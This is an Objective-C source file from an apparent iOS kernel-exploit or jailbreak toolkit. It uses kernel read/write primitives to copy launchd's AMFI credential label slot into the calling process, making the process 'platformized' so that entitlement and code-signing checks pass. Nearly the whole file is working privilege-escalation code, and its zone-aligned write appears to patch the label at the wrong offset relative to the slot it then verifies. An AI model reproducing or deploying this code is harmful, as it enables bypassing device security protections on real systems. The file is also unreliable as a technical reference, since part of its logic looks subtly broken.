//
//  platformize.m — self-platformization via kernel rw
//
//  AMFI checks platformization through ucred → cr_label → l_perpolicy[0].
//  launchd's slot carries the platform bit. Copy it over ours and
//  every mach-lookup / SPI entitlement-style check passes for this proc.
//
//  We do NOT patch the binary's csblob — we patch the cred label slot,
//  which is what AMFI actually queries at runtime.
//

#import <Foundation/Foundation.h>
#import "platformize.h"
#import "kexploit/kexploit_opa334.h"
#import "kexploit/krw.h"
#import "kexploit/kutils.h"
#import "kexploit/offsets.h"
#import "kexploit/xpaci.h"

extern uint64_t VM_MIN_KERNEL_ADDRESS;
extern uint64_t pac_mask;

#define S(x) ({ uint64_t _v = xpaci((uint64_t)(x)); \
    ((_v >> 32) > 0xFFFF ? (_v | pac_mask) : _v); })
#define K(x) ((x) > VM_MIN_KERNEL_ADDRESS)

// Same derived offsets as sandbox_escape.m
#define OFF_PROC_PROC_RO       0x18
#define OFF_PROC_RO_UCRED      0x20
#define OFF_UCRED_CR_LABEL     0x78
#define OFF_LABEL_AMFI_SLOT    0x08   // l_perpolicy[0]

static int pz_find_ucred(uint64_t proc, uint64_t *out) {
    uint64_t proc_ro = S(early_kread64(proc + OFF_PROC_PROC_RO));
    if (!K(proc_ro)) return -1;

    // Use the VERIFIED offset (0x20 on iOS 17.x) — heuristic scanning could
    // pick up a stale/freed cred object and cause use-after-free panic.
    uint64_t c = kread_smrptr(proc_ro + off_proc_ro_p_ucred);
    if (!K(c)) c = S(early_kread64(proc_ro + off_proc_ro_p_ucred));
    if (!K(c)) return -1;

    // sanity: cr_label must resolve
    uint64_t lbl = S(early_kread64(c + OFF_UCRED_CR_LABEL));
    if (!K(lbl)) return -1;

    *out = c;
    return 0;
}

int platformize_self(uint64_t self_proc) {
    if (!self_proc) { NSLog(@"[PLT] self_proc NULL"); return -1; }

    uint64_t launchd = proc_find_by_name("launchd");
    if (!launchd || launchd == (uint64_t)-1) launchd = proc_find(1);
    if (!launchd || launchd == (uint64_t)-1) {
        NSLog(@"[PLT] launchd not found");
        return -1;
    }

    uint64_t my_ucred = 0, ld_ucred = 0;
    if (pz_find_ucred(self_proc, &my_ucred) != 0) {
        NSLog(@"[PLT] our ucred not found");
        return -1;
    }
    if (pz_find_ucred(launchd, &ld_ucred) != 0) {
        NSLog(@"[PLT] launchd ucred not found");
        return -1;
    }

    // CRITICAL: sandbox_escape patches sandbox extension chains of OUR cred.
    // On iOS 17.5.1 this can cause kernel SMR to reclaim/rotate our cred
    // between calls. Re-read our ucred fresh and VALIDATE before use —
    // if the cred changed, re-resolve via proc_ro (never trust stale pointer).
    uint64_t fresh_ucred = 0;
    if (pz_find_ucred(self_proc, &fresh_ucred) == 0 && K(fresh_ucred)) {
        my_ucred = fresh_ucred; // use the live one
    }

    uint64_t my_label  = S(early_kread64(my_ucred + OFF_UCRED_CR_LABEL));
    uint64_t ld_label  = S(early_kread64(ld_ucred + OFF_UCRED_CR_LABEL));
    if (!K(my_label) || !K(ld_label)) {
        NSLog(@"[PLT] label invalid my=0x%llx ld=0x%llx", my_label, ld_label);
        return -1;
    }

    uint64_t my_amfi_slot = my_label + OFF_LABEL_AMFI_SLOT;
    uint64_t ld_amfi_slot = ld_label + OFF_LABEL_AMFI_SLOT;

    uint64_t my_val = early_kread64(my_amfi_slot);
    uint64_t ld_val = early_kread64(ld_amfi_slot);

    NSLog(@"[PLT] before: my_amfi=0x%llx launchd_amfi=0x%llx", my_val, ld_val);

    if (my_val == ld_val) {
        NSLog(@"[PLT] already platformized");
        return 0;
    }

    // Zone-safe write of ONLY the 8-byte AMFI slot inside the 32-byte
    // [MAC Labels] element:
    //   1. Align the destination DOWN to its 0x20 zone-element boundary
    //   2. Read the full 32-byte element (read-modify-write)
    //   3. Patch the 8 bytes at the in-element offset
    //   4. Write back the full element at the ALIGNED address
    // This can never cross the element boundary -> no zalloc bound panic.
    {
        uint64_t elemBase  = my_label & ~0x1FULL;
        uint32_t elemOff   = (uint32_t)(my_label & 0x1FULL);

        uint8_t elemBuf[32];
        early_kread(elemBase, elemBuf, 32);
        *(uint64_t *)(elemBuf + elemOff) = ld_val;
        early_kwrite32bytes(elemBase, elemBuf);
    }

    uint64_t check = early_kread64(my_amfi_slot);
    if (check != ld_val) {
        NSLog(@"[PLT] write verify failed");
        return -1;
    }

    NSLog(@"[PLT] *** PLATFORMIZED *** amfi slot 0x%llx -> 0x%llx", my_val, ld_val);
    return 0;
}
